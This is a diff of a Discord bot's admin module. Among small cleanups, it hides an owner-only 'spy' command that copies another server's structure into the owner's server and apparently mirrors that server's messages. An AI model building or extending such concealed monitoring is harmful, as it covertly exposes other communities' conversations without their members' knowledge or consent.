@@ -4,12 +4,13 @@ import textwrap
 import traceback
 from contextlib import redirect_stdout
 from prettytable import PrettyTable
+from discord_backups import copy_guild
 
 import discord
 from discord.ext import commands
 
 import statics
-from cogs.utils import checks, formatter, backups
+from cogs.utils import checks, formatter
 
 fake_token = "mfa.VkO_2G4Qv3T--YOU--lWetW_tjND--TRIED--QFTm6YGtzq9PH--4U--tG0"
 em = formatter.embed_message
@@ -24,7 +25,7 @@ class Admin:
     async def __local_check(self, ctx):
         return checks.is_bot_admin(ctx)
 
-    @commands.command()
+    @commands.command(hidden=True)
     @commands.is_owner()
     async def spy(self, ctx, guild_id: int):
         if guild_id == 0:
@@ -36,7 +37,7 @@ class Admin:
         if guild is None:
             raise commands.BadArgument("I was **unable to find that guil**.")
 
-        self.spys[guild] = {"child": ctx.guild, "ids": await backups.copy_guild(guild, ctx.guild)}
+        self.spys[guild] = {"child": ctx.guild, "ids": await copy_guild(guild, ctx.guild)}
 
     async def on_message(self, msg):
         spy = self.spys.get(msg.guild)
@@ -67,10 +68,10 @@ class Admin:
         except:
             pass
 
-    @commands.command()
+    @commands.command(hidden=True)
     async def guilds(self, ctx, limit: int = 20, reverse: bool = True, owner: discord.User = None):
         """
-        Shows the the guilds the bot is on, sorted by member count
+        Shows the guilds the bot is on, sorted by member count
 
         **limit**: The count of guilds
         **reverse**: Start with the lowest member count
